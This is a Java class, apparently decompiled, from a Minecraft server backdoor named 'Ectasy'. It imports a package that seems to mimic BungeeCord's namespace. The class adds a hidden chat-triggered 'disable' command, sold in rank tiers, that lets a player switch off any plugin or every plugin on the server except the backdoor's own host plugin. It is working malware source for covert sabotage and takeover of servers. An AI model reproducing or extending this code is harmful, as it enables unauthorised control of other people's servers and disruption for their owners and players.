package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;

@CommandInfo(
   name = "disable",
   description = "Disables a plugin",
   blatant = true,
   rank = Rank.FREE
)
public class DisablePluginCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length < 1) {
         ChatUtil.sendChat(var1.getPlayer(), "Please, use disable <plugin name> or disable *");
      } else {
         if (var3[0].equalsIgnoreCase("*")) {
            for(Plugin var7 : Bukkit.getServer().getPluginManager().getPlugins()) {
               if (!var7.getName().equals(Ectasy.parentPlugin.getDescription().getName())) {
                  Bukkit.getPluginManager().disablePlugin(var7);
               }
            }

            ChatUtil.sendChat(var1.getPlayer(), "Disabled all plugins on the server");
         } else if (Bukkit.getPluginManager().getPlugin(var3[0]) == null) {
            ChatUtil.sendChat(var1.getPlayer(), "The plugin does not exists. (Cap Sensitive)");
         } else if (Bukkit.getPluginManager().getPlugin(var3[0]).isEnabled()) {
            Bukkit.getPluginManager().disablePlugin(Bukkit.getPluginManager().getPlugin(var3[0]));
            ChatUtil.sendChat(var1.getPlayer(), var3[0] + " is now disabled.");
         } else {
            ChatUtil.sendChat(var1.getPlayer(), "The plugin is already disabled.");
         }
      }
   }
}
